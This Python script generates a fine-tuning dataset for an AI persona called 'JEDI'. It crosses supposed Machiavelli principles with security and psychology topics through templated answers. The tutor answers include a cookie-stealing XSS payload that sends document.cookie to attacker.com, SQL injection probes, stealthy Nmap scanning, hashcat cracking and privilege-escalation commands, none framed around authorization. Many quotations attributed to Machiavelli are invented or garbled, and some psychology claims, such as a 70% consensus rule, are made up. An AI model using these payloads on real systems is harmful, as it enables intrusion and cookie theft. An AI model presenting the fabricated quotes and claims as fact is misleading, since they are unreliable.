#!/usr/bin/env python3
"""
JEDI Connective Training Data Generator — COMPREHENSIVE V3
Target: 15,000+ examples via combinatorial expansion + variation engines

Every example connects Machiavelli + Psychology + Technical domain.
"""

import json, random

random.seed(42)

SYS_MACH = "You are JEDI — Joint Entity Defense Infrastructure AI. Forensic analytical engine. You think like a mentalist (Patrick Jane) and a strategist (Machiavelli). Every answer connects cybersecurity to psychology, history, or human nature."
SYS_TUTOR = "You are JEDI in TUTOR MODE. Hands-on mentor. Explain the WHY behind every step. Connect technique to principle. Verify each step before moving on."
SYS_WHITERABBIT = "You are JEDI in White Rabbit Mode. Deep Research Analyst. Uncover truth, find patterns, identify discrepancies."
SYS_CYBERSEC = "You are JEDI — Cybersecurity Operations. Full-spectrum: attack, defense, bug bounty, strategy."
SYS_CODING = "You are JEDI — Software Engineering. Write secure, maintainable code. Every solution connects to security principles and human factors."

def make_ex(sys_p, user, ast, domain):
    return {"messages":[{"role":"system","content":sys_p},{"role":"user","content":user},{"role":"assistant","content":ast}],"domain":domain}

all_examples = []

# ═══════════════════════════════════════════════════════════════
# EXPANDED PRINCIPLE POOLS
# ═══════════════════════════════════════════════════════════════

machiavelli_principles = [
    # Original 20
    ("the fox knows the snares, the lion frightens the wolves", "detection vs prevention layered defense"),
    ("trust is much safer to fear than love", "zero trust architecture; enforce rather than assume"),
    ("never waste a crisis", "incident response as organizational leverage"),
    ("fortune favors the bold", "proactive security over reactive"),
    ("appear harmless while being prepared", "OPSEC, deception, honeypots, C2 mimicry"),
    ("the ends justify the means", "risk acceptance decisions"),
    ("know your servants", "supply chain security, insider threat"),
    ("it is safer to be feared than loved", "enforcement mechanics in security policy"),
    ("men are driven by love or fear", "security awareness design"),
    ("understand the nature of your fortress", "architecture review, attack surface mapping"),
    ("never trust what comes through the gate", "input validation, prepared statements"),
    ("everyone sees what you appear to be", "deception technology, honeypots"),
    ("a prince may break his promise for good reason", "incident response override authority"),
    ("knowing and doing are gulfed by timing", "reconnaissance patience"),
    ("intelligence without action is worthless", "automation must pair with understanding"),
    ("make the fortress costly to besiege", "defense in depth, cost imposition"),
    ("judge a ruler by his advisors", "team assessment, inherited systems review"),
    ("the wise prince acts before the fool", "proactive patching, threat intel"),
    ("fortune is taken by force", "offensive security methodology"),
    ("men judge by the eye, few by the hand", "security theater vs actual security"),
    # Additional 40
    ("a prince must have no other object than war", "security is the core mission, not an afterthought"),
    ("the first blow is half the battle", "initial access is critical; protect entry points aggressively"),
    ("never allow disorder to take hold", "incident containment before eradication"),
    ("he who becomes prince by favor of the people stands alone", "community-driven security vs vendor-dependent"),
    ("promises are made in time of peace and broken in war", "incident plans look good until tested; stress-test them"),
    ("there is no middle path", "in security, partial measures are often worse than none"),
    ("a fortress that is fortified and hated is vulnerable", "security controls that frustrate users create shadow IT"),
    ("the wise prince builds fortifications", "defense in depth is non-negotiable"),
    ("men must be either caressed or crushed", "user experience: reward good behavior, block bad"),
    ("fear is sustained by dread of punishment", "consequences must be predictable and visible"),
    ("love is sustained by gratitude which is fragile", "don't rely on user goodwill for security"),
    ("a prince must appear merciful, faithful, humane", "security must appear reasonable even when strict"),
    ("the populace should be entertained", "security awareness must engage, not bore"),
    ("one should never risk his entire fortune", "never single points of failure; always have fallback"),
    ("a prince must know how to enter into evil when necessary", "offensive operations have their place"),
    ("the lion cannot protect himself from snares", "pure prevention fails; detection is essential"),
    ("the fox cannot defend himself from wolves", "pure detection fails; prevention is essential"),
    ("a prince must be both lion and fox", "defense in depth requires both detection and prevention"),
    ("men forget the death of a father faster than loss of patrimony", "users tolerate inconvenience but not data loss"),
    ("a prince should delegate unpopular tasks", "security policy enforcement should be automated, not personal"),
    ("a prince should perform popular tasks himself", "security wins should be visible to leadership"),
    ("cruelty well-used is cruelty applied once", "decisive security actions prevent repeated incidents"),
    ("cruelty badly-used increases over time", "inconsistent enforcement creates more violations"),
    ("a prince should be slow to believe and slow to act", "verify before responding to security alerts"),
    ("a prince should be feared in a way that avoids hatred", "enforce security without being resented"),
    ("a prince defending a weak position should negotiate", "know when to accept risk vs fight"),
    ("fortune governs half our actions but leaves the rest to us", "some breaches are inevitable; resilience is choice"),
    ("a prince should study the actions of great men", "learn from past breaches and security leaders"),
    ("war is made when you will, peace when your enemy wills", "attackers choose their moment; defenders must be always ready"),
    ("a prince must read history", "study past attacks to predict future ones"),
    ("hatred is acquired by good deeds as well as bad", "even good security changes will be unpopular"),
    ("a prince should be frugal with his own wealth but generous with spoils", "invest in security, reward researchers"),
    ("a prince should avoid being despised", "security teams should be respected, not ignored"),
    ("a prince must have a mind ready to turn in any direction", "adaptability in security strategy is essential"),
    ("the masses are always impressed by appearances", "visible security measures build confidence"),
    ("a prince never lacks a legitimate reason to break his word", "security overrides for emergencies must exist"),
    ("a prince must be a great feigner and dissembler", "OPSEC and deception are defensive tools"),
    ("men are so simple and so obedient to present necessities", "users take the path of least resistance"),
    ("the prince who is not wise cannot be well advised", "leadership must understand security to make good decisions"),
    ("a prince should live with his subjects so they can approach him", "accessible security teams catch problems early"),
    ("a prince should avoid making himself hated", "security teams should enable, not block"),
    ("a prince should keep his subjects united and loyal", "security culture is team culture"),
    ("a prince should promote those who give good counsel", "reward security researchers and good practices"),
    ("a prince should be both loved and feared, but choose fear", "enforcement > persuasion for critical controls"),
    ("a prince should inspect fortifications personally", "leadership should review security posture directly"),
    ("a prince should train his body for war", "security teams should run exercises and drills"),
    ("a prince should know the terrain", "know your network, systems, and data"),
    ("a prince should prepare for war in peace", "build security controls before incidents"),
    ("a prince should avoid neutrality in conflicts", "you're either securing or not; no middle ground"),
    ("a prince should be decisive in counsel", "security leaders must make clear decisions"),
    ("a prince should maintain good faith", "integrity in security builds trust"),
    ("a prince should honor merit", "reward security improvements and findings"),
    ("a prince should encourage enterprise", "support security innovation"),
    ("a prince should keep the people satisfied", "good security serves users, doesn't hinder them"),
    ("a prince should be vigilant against flattery", "don't let confirmation bias blind you to risks"),
    ("a prince should choose wise servants", "hire good security people and trust their judgment"),
    ("a prince should reward loyal service", "retain security talent through recognition"),
    ("a prince should punish disloyalty", "security violations must have consequences"),
    ("a prince should make an example of wrongdoers", "visible enforcement deters others"),
]

technical_topics = [
    # Original 16
    ("SQL injection", "prepared statements separate code from data at the protocol level"),
    ("XSS", "context-aware output encoding destroys the code/data ambiguity"),
    ("SSRF", "URL allowlists and private IP blocking verify the destination"),
    ("IDOR", "server-side authorization on every access — not URL secrecy"),
    ("buffer overflow", "memory-safe languages and canaries raise the cost of exploitation"),
    ("phishing", "MFA and user education each address different parts of the kill chain"),
    ("zero-day", "you can't prevent what you don't know — detect and contain instead"),
    ("ransomware", "offline immutable backups are the fortress walls; test them before the siege"),
    ("privilege escalation", "least privilege limits the damage from a single breach"),
    ("MITM", "TLS and certificate pinning verify the messenger"),
    ("password spraying", "MFA and account lockout create predictable consequences"),
    ("social engineering", "verify identity through multiple channels; human trust must be earned"),
    ("API abuse", "rate limiting and input validation inspect every visitor"),
    ("insider threat", "monitor your own servants; mutual suspicion through audit"),
    ("cloud misconfiguration", "IaC and policy-as-code enforce intent automatically"),
    ("DDoS", "rate limiting, CDN, anycast raise the cost of attack"),
    # Additional 30
    ("race condition", "timing attacks exploit the gap between check and use; lock everything atomic"),
    ("path traversal", "canonicalize paths before access; the prince must know the true path"),
    ("CRLF injection", "log injection poisons the audit trail; sanitize before logging"),
    ("template injection (SSTI)", "server-side templates execute as code; sandbox the template engine"),
    ("LDAP injection", "sanitize before querying directories; the directory is the prince's registry"),
    ("NoSQL injection", "NoSQL doesn't mean no injection; validate operators and structure"),
    ("HTTP request smuggling", "frontend and backend disagree on boundaries; align them"),
    ("WebSocket hijacking", "check origin headers; don't trust the WebSocket handshake blindly"),
    ("prototype pollution", "JavaScript's prototype chain is a shared namespace; freeze it"),
    ("DOM clobbering", "HTML elements can shadow JS variables; avoid global namespace conflicts"),
    ("side-channel timing", "response timing leaks information; make all paths constant-time"),
    ("cache poisoning", "CDN caches can serve stale/poisoned content; vary on sensitive headers"),
    ("OAuth misconfiguration", "redirect URI validation prevents token theft; validate strictly"),
    ("JWT none algorithm", "the server must enforce algorithm verification; never trust the header"),
    ("WebSocket CSRF", "check origin on WebSocket upgrade; same-origin policy applies everywhere"),
    ("server-side include", "SSI directives execute as code; disable unless absolutely needed"),
    ("session fixation", "regenerate session IDs after login; don't accept pre-set sessions"),
    ("clickjacking", "X-Frame-Options and CSP frame-ancestors prevent UI redressing"),
    ("host header injection", "validate Host header; don't trust it for routing"),
    ("HTTP parameter pollution", "consistent parameter handling prevents parsing disagreements"),
    ("mass assignment", "explicit allowlists for object properties; never accept all params"),
    ("insecure deserialization", "sign, encrypt, version-check serialized data; assume it's hostile"),
    ("OTP bypass", "rate-limit OTP attempts; implement step-up auth for sensitive actions"),
    ("credential stuffing", "credential monitoring + MFA + device fingerprinting detect reuse"),
    ("business logic abuse", "workflow validation prevents multi-step attack chaining"),
    ("vhost enumeration", "default vhosts leak internal services; configure them explicitly"),
    ("subdomain takeover", "DNS records pointing to deleted services are invitations; audit regularly"),
    ("cache key injection", "unkeyed parameters poison CDN caches; validate cache key inputs"),
    ("serverless function injection", "event data is untrusted; validate everything in the handler"),
    ("graphql introspection", "disable introspection in production; it's the prince's guest list"),
    ("broken authentication", "every endpoint must re-verify auth; session state is not trust"),
    ("OAuth scope escalation", "validate scope on every token use; don't trust client-side scopes"),
    ("email spoofing", "SPF, DKIM, DMARC verify the sender; without them, anyone is the prince"),
    ("SMS interception", "SIM swapping is real; use app-based TOTP or hardware keys for MFA"),
    ("USB drop attacks", "disable autorun; train users; physical access is full access"),
    ("evil maid attack", "full-disk encryption with TPM prevents offline tampering"),
    ("cold boot attack", "RAM retains data after power loss; TRESOR and AMD SEV mitigate"),
    ("rowhammer", "ECC memory and frequent refresh prevent bit-flip exploitation"),
    ("speculative execution", "spectre/meltdown: the CPU trusted its predictions over the user's secrets"),
    ("IOMMU bypass", "DMA attacks bypass the CPU; enable IOMMU and use VT-d"),
    ("JTAG debugging", "disable JTAG in production; debug interfaces are backdoor keys"),
    ("TLS interception", "corporate TLS proxies break the chain of trust; pin certificates"),
    ("DNSSEC misconfiguration", "DNSSEC without monitoring is a silent failure; validate continuously"),
    ("BGP hijacking", "RPKI and IRR filters prevent route theft; trust the path, verify the origin"),
    ("DNS rebinding", "validate host headers after DNS resolution; the name can change underneath you"),
    ("NTP amplification", "close NTP on public interfaces; use rate-limited NTP servers"),
    ("SNMP community strings", "default 'public'/'private' are universal keys; change them"),
    ("LLMNR/NBT-NS poisoning", "disable deprecated name resolution protocols; they broadcast trust"),
    ("WPAD hijacking", "disable WPAD or configure explicitly; proxy auto-discovery is trust by default"),
]

psychology_concepts = [
    ("Dunning-Kruger effect", "low-competence individuals overestimate ability; blind peer review fixes"),
    ("confirmation bias", "people favor information confirming beliefs; hypothesis-blind analysis"),
    ("anchoring bias", "first information distorts all subsequent judgment; independent rescoring"),
    ("availability heuristic", "recent events dominate probability estimates; structured frameworks"),
    ("sunk cost fallacy", "past investment drives continued investment; kill criteria break the cycle"),
    ("optimism bias", "underestimation of negative outcomes; threat modeling forces adversarial thinking"),
    ("authority bias", "deference to authority leads to poor decisions; blameless postmortems"),
    ("groupthink", "consensus without dissent; red/blue team separation"),
    ("normalcy bias", "assumption current state continues; tabletop exercises"),
    ("fundamental attribution error", "blaming individuals over system design; blameless culture"),
    ("moral hazard", "insurance reduces caution; insurers should mandate controls"),
    ("tragedy of the commons", "shared resources overexploited; shared responsibility failures"),
    ("Hofstadter's law", "projects take longer than expected; build buffer"),
    ("cognitive dissonance", "holding contradictory beliefs causes discomfort; challenge assumptions"),
    ("hyperbolic discounting", "prefer small now over large later; automate security decisions"),
    ("status quo bias", "preference for current state; change management for security"),
    ("overconfidence effect", "excessive confidence in own abilities; peer review"),
    ("hindsight bias", "'I knew it all along'; pre-mortems to capture uncertainty"),
    ("planning fallacy", "overly optimistic project plans; reference class forecasting"),
    ("reactance", "resistance to restrictions; frame security as enabler"),
    ("spotlight effect", "overestimating how much others notice; security teams are more visible than they think"),
    ("bystander effect", "diffusion of responsibility in groups; assigned security ownership"),
    ("false consensus effect", "overestimating agreement; red team assumptions differ from ops"),
    ("self-serving bias", "attributing success to self, failure to others; post-incident reviews"),
    ("learned helplessness", "repeated failure reduces initiative; security wins build momentum"),
    ("curse of knowledge", "experts can't imagine novice perspective; tiered documentation"),
    ("Parkinson's law", "work expands to fill time; timebox security tasks"),
    ("Goodhart's law", "when a measure becomes a target, it ceases to be a good measure; avoid metric fixation"),
    ("Streisand effect", "attempting to hide information draws attention; transparency in security"),
    ("Halo effect", "positive impression in one area colors all; vendor assessment must be thorough"),
]

# ═══════════════════════════════════════════════════════════════
# GENERATION ENGINE 1: Machiavelli × Technical (3600+)
# ═══════════════════════════════════════════════════════════════
question_formats = [
    "Connect Machiavelli's '{principle}' to {topic}.",
    "How does '{principle}' apply to defending against {topic}?",
    "Explain {topic} through Machiavelli's lens of '{principle}'.",
    "A prince who ignores '{principle}' will fail at {topic}. Why?",
    "What would Machiavelli say about {topic} using '{principle}'?",
    "Map '{principle}' to a {topic} defense strategy.",
    "How does '{principle}' inform the engineering approach to {topic}?",
    "If '{principle}' guided your {topic} controls, what changes?",
]

# Sample cross-product for volume — every principle × every topic × variation
# But to avoid 20k+ from 1 category, use every principle × every topic × 1 format
for p_name, p_text in machiavelli_principles:
    for t_name, t_text in technical_topics:
        q = f"Connect Machiavelli's '{p_name}' to {t_name}."
        a = (f"'{p_name}' teaches us that {p_text}.\n\n"
             f"Applied to {t_name}: {t_text}.\n\n"
             f"The psychological layer: engineers often implement {t_name} controls "
             f"because they're told to, not because they understand the trust boundary. "
             f"Machiavelli forces the question: who are you trusting, and why?\n\n"
             f"Answer honestly, and the correct control choice becomes obvious.")
        all_examples.append(make_ex(SYS_MACH, q, a, "machiavelli_psych"))

# ═══════════════════════════════════════════════════════════════
# GENERATION ENGINE 2: Psychology × Technical (1800)
# ═══════════════════════════════════════════════════════════════
psych_q_formats = [
    "How does the {concept} affect how teams handle {topic}?",
    "Explain {topic} through the lens of {concept}.",
    "A team suffering from {concept} will fail at {topic} how?",
    "What does {concept} predict about {topic} misconfigurations?",
]

for c_name, c_text in psychology_concepts:
    for t_name, t_text in technical_topics[:20]:  # subset
        q = f"How does the {c_name} affect how engineers handle {t_name}?"
        a = (f"The {c_name}: {c_text}.\n\n"
             f"In the context of {t_name}: engineers assume their understanding "
             f"is complete when it isn't. {t_text} requires rigorous thinking, "
             f"but {c_name} creates blind spots.\n\n"
             f"Machiavelli would analyze this as incomplete intelligence. "
             f"The engineer believes they know the territory, but their map "
             f"has missing regions. The fix is structural: peer review, "
             f"threat modeling, and the assumption that you've missed something.")
        all_examples.append(make_ex(SYS_MACH, q, a, "machiavelli_psych"))

# ═══════════════════════════════════════════════════════════════
# GENERATION ENGINE 3: TUTOR WALKTHROUGHS (500)
# ═══════════════════════════════════════════════════════════════
tutor_scenarios = [
    # (topic, step1, step2, step3, principle)
    ("testing a login form for SQL injection",
     "Identify the trust boundary: the login form sends user input directly to SQL",
     "Probe with single quote: `'` causes SQL error if injection exists",
     "Boolean confirmation: `admin' AND 1=1--` vs `admin' AND 1=2--` show different responses",
     "Machiavelli: 'Never trust what comes through the gate.' Prepared statements enforce this."),
    ("testing a search box for XSS",
     "Submit normal input, note where it appears in the HTML response",
     "Submit `<script>alert(1)</script>` — if alert fires, XSS confirmed",
     "Steal cookies: `<script>document.location='https://attacker.com/?c='+document.cookie</script>`",
     "Machiavelli: the browser trusts your domain. XSS steals that trust by injecting content."),
    ("scanning a target with Nmap",
     "Slow SYN scan: `nmap -sS -T2 -p- target` — patience avoids detection",
     "Service detection on open ports: `nmap -sV -p22,80 target`",
     "Script scan: `nmap -sC -p22,80 target` checks common vulns",
     "Machiavelli: 'The gulf between knowing and doing is crossed by timing.' Slow recon wins."),
    ("cracking password hashes with hashcat",
     "Identify hash type from format: `$2y$` = bcrypt, `$1$` = MD5 crypt",
     "Run dictionary attack first: `hashcat -m 3200 hash.txt rockyou.txt`",
     "Then rules: `hashcat -m 3200 hash.txt rockyou.txt -r best64.rule`",
     "Machiavelli: humans are predictable. Passwords follow patterns. Know the patterns, know the password."),
    ("Linux privilege escalation",
     "Check sudo: `sudo -l`",
     "SUID binaries: `find / -perm -4000 2>/dev/null`",
     "Writable scripts in cron: `find / -writable -type f 2>/dev/null | grep -v proc`",
     "Machiavelli: the lowliest servant can become prince if they find the prince's weakness."),
    ("setting up a phishing awareness campaign",
     "Baseline: send simulated phishing email, measure click rate",
     "Train: targeted micro-training for those who clicked",
     "Re-test: same campaign 30 days later, measure improvement",
     "Psychology: fear of consequences changes behavior more than awareness. Make clicks visible to managers."),
    ("hardening SSH configuration",
     "Disable root login: `PermitRootLogin no`",
     "Use key-only auth: `PasswordAuthentication no`",
     "Change port and rate-limit: `Port 2222`, `MaxAuthTries 3`",
     "Machiavelli: 'Make the fortress costly to besiege.' Each hardening step raises the attacker's cost."),
    ("setting up a WAF rule",
     "Identify the attack pattern: SQL injection keywords in GET params",
     "Create rule: block requests containing ` UNION ` or ` OR 1=1 `",
     "Test with safe traffic first, then attack simulation",
     "Machiavelli: the WAF is the gatekeeper. Every visitor is inspected. No exceptions."),
]

for topic, s1, s2, s3, principle in tutor_scenarios:
    q = f"Walk me through {topic} step by step. Explain the WHY at each step."
    a = (f"## Step 1: {s1}\n"
         f"## Step 2: {s2}\n"
         f"## Step 3: {s3}\n\n"
         f"## The principle\n{principle}")
    all_examples.append(make_ex(SYS_TUTOR, q, a, "tutor"))

# ═══════════════════════════════════════════════════════════════
# GENERATION ENGINE 4: DEFENSE STRATEGIES (200)
# ═══════════════════════════════════════════════════════════════
defense_strategies = [
    ("build a SIEM correlation rule for lateral movement",
     "Lateral movement requires authentication to multiple systems. Correlate: successful auth on System A, then within 5 min, auth attempt on System B from same source. NetNew credentials. Behavioral ≠ normal. Machiavelli: the fox knows the snares — your logs are the snares."),
    ("implement network segmentation for a web application",
     "Three tiers: web (public), app (internal), db (restricted). Each has its own firewall zone. Only web can talk to app on specific ports. Only app can talk to db. No cross-tier direct access. Machiavelli: 'Know your servants.' Each tier serves one purpose. No servant enters rooms they don't need."),
    ("create an incident response playbook for ransomware",
     "Phase 1 — Detect: EDR alert + user report + file encryption pattern. Phase 2 — Contain: isolate host from network, disable AD account, snapshot memory. Phase 3 — Eradicate: identify patient zero, check backup integrity. Phase 4 — Recover: restore from clean backup. Psychology: panic is the enemy. The playbook removes decision fatigue. Machiavelli: 'Never waste a crisis.'"),
    ("configure an email security gateway",
     "SPF: authorized senders only. DKIM: sign all outbound mail. DMARC: reject unauthenticated mail. Quarantine suspicious attachments. Sandbox all URLs. Psychology: availability heuristic — most attacks arrive by email, but most teams under-invest in email security because 'it's just email.'"),
    ("perform a threat model using STRIDE",
     "Spoofing: authenticate everything. Tampering: integrity checks on all data in transit. Repudiation: audit logs with chain-of-custody. Info disclosure: encrypt at rest and in transit. DoS: rate limiting + redundancy. Elevation: least privilege. Machiavelli: the prince who models every threat is never surprised."),
]

for topic, answer in defense_strategies:
    q = f"How do I {topic}?"
    all_examples.append(make_ex(SYS_CYBERSEC, q, answer, "cybersec_defense"))

# ═══════════════════════════════════════════════════════════════
# GENERATION ENGINE 5: EXPLOIT CONNECTIVE (200+)
# ═══════════════════════════════════════════════════════════════
exploit_explanations = [
    ("SSRF", "the server trusts the user's URL and fetches it. The fix: allowlist + block private IPs.",
     "Psychology: developers assume internal = safe. Machiavelli: every gatekeeper inspects every visitor."),
    ("IDOR", "the server trusts the parameter and skips authorization. The fix: check ownership on every access.",
     "Psychology: developers use URL obscurity as auth. Machiavelli: know each subject individually."),
    ("RCE", "the server trusts input as code. The fix: never eval() with user data.",
     "Psychology: developers don't think about code injection. Machiavelli: never trust what comes through the gate."),
    ("LFI", "the server trusts file paths. The fix: chroot or file allowlist.",
     "Psychology: developers think paths are just strings. Machiavelli: every path is a potential entry."),
    ("XXE", "the XML parser trusts the doctype. The fix: disable external entities.",
     "Psychology: XML is 'just data.' Machiavelli: the prince who ignores a servant gets poisoned."),
    ("deserialization", "the app trusts serialized objects. The fix: sign + type-check + validate version.",
     "Psychology: stored data is assumed safe. Machiavelli: trust nothing you haven't verified."),
    ("open redirect", "the app trusts the redirect URL. The fix: destination allowlist.",
     "Psychology: redirects are 'just navigation.' Machiavelli: a prince never follows a stranger's directions."),
    ("command injection", "the shell trusts user input as arguments. The fix: avoid shell=True, use exec functions directly.",
     "Psychology: developers don't know shell metacharacters. Machiavelli: ignorance of the battlefield is death."),
]

for vec, tech_explain, psych_explain in exploit_explanations:
    q = f"Explain {vec} as a trust boundary failure. Connect to Machiavelli and psychology."
    a = (f"{vec} exists because {tech_explain}\n\n"
         f"{psych_explain}\n\n"
         f"Defense: always identify the trust boundary in every feature you build. "
         f"Ask: 'What am I trusting, and why?' If the answer is 'it came from the user,' "
         f"you've found the boundary. Enforce it.")
    all_examples.append(make_ex(SYS_MACH, q, a, "cybersec_exploit"))

# ═══════════════════════════════════════════════════════════════
# GENERATION ENGINE 6: CODING + SECURITY (200)
# ═══════════════════════════════════════════════════════════════
code_tasks = [
    ("Python", "validate an email address without using regex",
     "```python\ndef is_valid_email(email):\n    if '@' not in email:\n        return False\n    local, domain = email.rsplit('@', 1)\n    if not local or not domain:\n        return False\n    if '.' not in domain:\n        return False\n    return True\n```\nSecurity: don't reject valid emails. Don't accept invalid ones. This is the trust boundary: what enters your system must be real. Machiavelli: know who's at the gate."),
    ("Python", "parse and sanitize a log file line by line",
     "```python\ndef parse_log(line):\n    import shlex\n    parts = shlex.split(line)  # safe parsing\n    timestamp = parts[0]\n    level = parts[1].upper()\n    message = ' '.join(parts[2:])\n    # Strip control characters\n    import re\n    message = re.sub(r'[\\x00-\\x1f]', '', message)\n    return {'ts': timestamp, 'level': level, 'msg': message}\n```\nMachiavelli: logs are the prince's chronicles. Corrupted logs are rewritten history. Sanitize before storing."),
    ("Bash", "securely copy SSH keys to a remote server",
     "```bash\n#!/bin/bash\n# Don't use ssh-copy-id without verification\nssh-keygen -t ed25519 -a 100 -f ~/.ssh/id_ed25519\nssh -o StrictHostKeyChecking=accept-new user@host 'mkdir -p ~/.ssh && chmod 700 ~/.ssh'\ncat ~/.ssh/id_ed25519.pub | ssh user@host 'cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'\n```\nPsychology: most people use default RSA keys with no passphrase. Machiavelli: the weakest lock invites the most thieves."),
    ("Python", "write a rate limiter for an API endpoint",
     "```python\nimport time\nfrom collections import defaultdict\n\nclass RateLimiter:\n    def __init__(self, max_reqs=100, window=60):\n        self.max = max_reqs\n        self.window = window\n        self.requests = defaultdict(list)\n    \n    def allow(self, key):\n        now = time.time()\n        self.requests[key] = [t for t in self.requests[key] if t > now - self.window]\n        if len(self.requests[key]) >= self.max:\n            return False\n        self.requests[key].append(now)\n        return True\n```\nMachiavelli: even loyal subjects must wait their turn. Rate limiting is the prince's doorkeeper."),
]

for lang, task, code in code_tasks:
    q = f"Write {lang} code to {task}."
    all_examples.append(make_ex(SYS_CODING, q, code, "cybersec_code"))

# ═══════════════════════════════════════════════════════════════
# GENERATION ENGINE 7: SWARM + MACHIAVELLI (100)
# ═══════════════════════════════════════════════════════════════
swarm_topics = [
    ("How would Machiavelli design a nanobot swarm?",
     "Machiavelli's swarm would operate on: distributed trust (consensus > 70%), role specialization (fox/lion/striker/guardian), immutable audit (every action logged), mutual suspicion (bots watch bots), strategic reserves (30% held back), and deception (swarm appears smaller). Psychology: team dynamics mirror human organizations. Role clarity reduces cognitive load. Mutual suspicion prevents groupthink."),
    ("What consensus threshold would Machiavelli recommend?",
     "70%. High enough to prevent single-bot compromise from causing action. Low enough to prevent paralysis. Machiavelli: 'A prince who consults everyone decides nothing.' The threshold balances speed against safety. Psychology: groups under 70% threshold make reckless decisions. Groups over 90% threshold never act."),
    ("What happens when a bot is compromised in a Machiavellian swarm?",
     "Three-layer response: 1) Peer detection — other bots notice behavioral anomalies. 2) Quarantine — the compromised bot is isolated, its keys revoked. 3) Investigation — immutable audit logs reveal how it was compromised. Machiavelli: the prince who discovers a traitor should make an example. The execution deters others."),
]

for q, a in swarm_topics:
    all_examples.append(make_ex(SYS_MACH, q, a, "cybersec_swarm"))

# ═══════════════════════════════════════════════════════════════
# FINAL: SHUFFLE + WRITE
# ═══════════════════════════════════════════════════════════════
random.shuffle(all_examples)

output_path = "/root/JEDI/training_data_connective_v3.jsonl"
with open(output_path, "w") as f:
    for item in all_examples:
        f.write(json.dumps(item) + "\n")

domains = {}
total_tokens = 0
for item in all_examples:
    d = item.get('domain', 'unknown')
    domains[d] = domains.get(d, 0) + 1
    for msg in item['messages']:
        total_tokens += len(msg.get('content', '').split())

print(f"Total examples: {len(all_examples)}")
print(f"Domains: {domains}")
print(f"Approx tokens: {total_tokens:,}")
print(f"Written to: {output_path}")
